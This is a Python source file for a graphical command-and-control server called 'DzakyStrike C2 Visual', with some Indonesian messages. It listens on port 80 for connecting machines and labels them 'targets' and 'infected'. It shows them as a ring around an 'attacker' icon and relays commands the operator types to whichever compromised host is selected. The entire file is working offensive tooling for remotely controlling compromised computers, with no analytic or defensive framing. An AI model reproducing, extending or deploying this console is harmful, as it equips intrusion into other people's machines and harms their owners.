import tkinter as tk
from tkinter import scrolledtext
import socket, threading, queue, os, math
from PIL import Image, ImageTk

HOST = '0.0.0.0'
PORT = 80
BUFFER_SIZE = 4096

clients = {}
client_queues = {}
client_ids = {}
selected_target = None
next_id = 1


def load_image(path, fallback_color="#FF0000"):
    if not os.path.exists(path):
        img = Image.new("RGB", (64, 64), fallback_color)
        return ImageTk.PhotoImage(img)
    return ImageTk.PhotoImage(Image.open(path).resize((64, 64)))


class C2GUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('DzakyStrike C2 Visual')
        self.geometry('900x700')
        self.configure(bg='#222')
        self.resizable(False, False)

        self.infection_count = 0
        self.infection_order = []
        self.computers = {}

        self.firewall_img = load_image('attacker.png')
        self.client_img = load_image('infected.png')

        bar = tk.Frame(self, bg='#333')
        bar.pack(fill='x', pady=5)
        self.total_label = tk.Label(bar, text='Total Infected: 0', fg='white', bg='#333')
        self.total_label.pack(side='right', padx=10)

        self.canvas = tk.Canvas(self, bg='#222', height=300)
        self.canvas.pack(fill='x')
        self.center = (450, 150)
        cx, cy = self.center
        self.canvas.create_image(cx, cy, image=self.firewall_img)
        self.canvas.create_text(cx, cy + 50, text='attacker', fill='white')

        self.output = scrolledtext.ScrolledText(self, bg='#111', fg='#0f0', height=15)
        self.output.pack(fill='both', expand=True, padx=5, pady=5)

        cmdf = tk.Frame(self, bg='#333')
        cmdf.pack(fill='x', pady=5)
        self.cmd_entry = tk.Entry(cmdf, bg='#000', fg='white')
        self.cmd_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.cmd_entry.bind('<Return>', lambda e: self.send_cmd())

        btn_frame = tk.Frame(cmdf, bg='#333')
        btn_frame.pack(side='right')
        tk.Button(btn_frame, text='Send', command=self.send_cmd, bg='#555', fg='white').pack(side='left', padx=5)
        tk.Button(btn_frame, text='Minimize', command=self.iconify, bg='#555', fg='white').pack(side='left', padx=5)
        tk.Button(btn_frame, text='Restore', command=self.restore_window, bg='#555', fg='white').pack(side='left', padx=5)
        tk.Button(btn_frame, text='Maximize', command=self.maximize_window, bg='#555', fg='white').pack(side='left', padx=5)

        self.status = tk.Label(self, text='0 clients connected', bg='#333', fg='white')
        self.status.pack(fill='x')

        self.after(500, self.update_output)

    def restore_window(self):
        self.deiconify()
        self.geometry("900x700")
        self.resizable(False, False)

    def maximize_window(self):
        self.state('zoomed')

    def add_client(self, cid, ip):
        self.infection_count += 1
        idx = self.infection_count
        self.infection_order.append(cid)

        angle = math.radians((idx - 1) * (360 / 12))
        r = 150
        cx, cy = self.center
        x = cx + r * math.cos(angle)
        y = cy + r * math.sin(angle)

        icon = self.canvas.create_image(x, y, image=self.client_img, tags=cid)
        label = self.canvas.create_text(x, y + 50, text=f'{cid}\n{ip}\n#{idx}', fill='white')
        arrow = self.canvas.create_line(cx, cy, x, y, fill='red', width=2, arrow=tk.LAST)

        self.computers[cid] = (icon, label, arrow)
        self.canvas.tag_bind(cid, '<Button-1>', lambda e, c=cid: self.select_client(c))
        self.update_total()

    def remove_client(self, cid):
        if cid in self.computers:
            for item in self.computers[cid]:
                self.canvas.delete(item)
            del self.computers[cid]
            self.infection_order.remove(cid)
            self.update_total()

    def update_total(self):
        self.total_label.config(text=f'Total Infected: {len(self.computers)}')
        self.status.config(text=f'{len(self.computers)} clients connected')

    def select_client(self, cid):
        global selected_target
        selected_target = cid
        self.output.insert('end', f'[🎯] Target Selected: {cid}\n')
        self.output.see('end')

    def send_cmd(self):
        global selected_target
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        if not selected_target:
            self.output.insert('end', '[!] Pilih target dulu\n')
            self.output.see('end')
            return
        try:
            clients[selected_target].sendall((cmd + '\n').encode())
            self.output.insert('end', f'> {cmd}\n')
            self.output.see('end')
            self.cmd_entry.delete(0, 'end')
        except Exception as e:
            self.output.insert('end', f'[!] Gagal kirim: {e}\n')
            self.output.see('end')

    def update_output(self):
        for cid, q in client_queues.items():
            while not q.empty():
                msg = q.get()
                if cid == selected_target:
                    self.output.insert('end', msg + '\n')
                    self.output.see('end')
        self.after(500, self.update_output)


def handle_client(conn, addr, cid, gui):
    q = queue.Queue()
    clients[cid] = conn
    client_queues[cid] = q
    client_ids[conn] = cid
    gui.add_client(cid, addr[0])
    try:
        while True:
            data = conn.recv(BUFFER_SIZE)
            if not data:
                break
            q.put(data.decode(errors='ignore').rstrip())
    except Exception as e:
        print(f"[!] Error client {cid}: {e}")
    finally:
        conn.close()
        clients.pop(cid, None)
        client_queues.pop(cid, None)
        gui.remove_client(cid)


def accept_clients(gui):
    global next_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        cid = f"target-{next_id}"
        next_id += 1
        threading.Thread(target=handle_client, args=(conn, addr, cid, gui), daemon=True).start()


if __name__ == "__main__":
    gui = C2GUI()
    threading.Thread(target=accept_clients, args=(gui,), daemon=True).start()
    gui.mainloop()
